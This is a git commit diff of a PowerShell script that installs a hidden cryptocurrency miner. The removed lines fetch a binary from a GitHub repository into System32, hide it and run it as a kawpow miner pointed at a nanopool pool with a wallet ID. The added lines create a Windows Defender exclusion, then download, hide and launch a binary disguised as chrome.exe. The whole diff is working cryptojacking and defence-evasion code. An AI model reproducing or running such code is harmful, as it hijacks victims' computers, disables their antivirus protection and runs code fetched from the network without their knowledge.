f9f8f703bb2d0c85f2ac57abbd8d95b0bba894e2
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-08 18:31:56 +0300

    Update script12GS-03.ps1

--- script12GS-03.ps1
+++ script12GS-03.ps1
@@ -1,9 +1,9 @@
-$Folder = 'C:\Windows\System32\Windows_System32.exe'
+$Folder = 'C:\Windows\System32\Microsoft\Windows_System32.exe'
 "Test to see if folder [$Folder]  exists"
 if (Test-Path -Path $Folder) {
     "Path exists!"
-    C:\Windows\System32\Windows_System32.exe -a kawpow -i 40 -o rvn-eu1.nanopool.org -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-01
+    C:\Windows\System32\Microsoft\chrome.exe
 } else {
     "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe  -a kawpow -i 40 -o rvn-eu1.nanopool.org -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-01
+    Add-MpPreference -ExclusionPath "C:\Windows\System32\Microsoft" ; cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/chrome.exe" -OutFile chrome.exe ; attrib +h chrome.exe; C:\Windows\System32\Microsoft\chrome.exe
 }
